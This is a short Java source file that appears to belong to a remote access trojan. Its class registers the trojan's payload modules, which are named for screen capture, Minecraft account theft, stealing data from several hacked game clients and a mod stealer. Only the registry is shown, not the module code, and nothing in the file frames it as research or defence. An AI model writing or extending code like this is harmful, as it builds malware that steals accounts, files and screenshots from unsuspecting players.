package eureka.rat.payloads;

import eureka.rat.features.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Payloads {
    private static final Payloads instance = new Payloads();
    private final List<Payload> payloads = new ArrayList();

    private Payloads() {
        payloads.addAll(Arrays.asList(
                new User(),
                new ScreenCapture(),
                new MCAccounts(),
                new Meteor(),
                new Future(),
                new Konas(),
                new RusherHack(),
                new SalHack(),
                new JorneyMap(),
                new ModStealer())
        );
    }

    public static List<Payload> getPayloads() {
        return instance.payloads;
    }
}
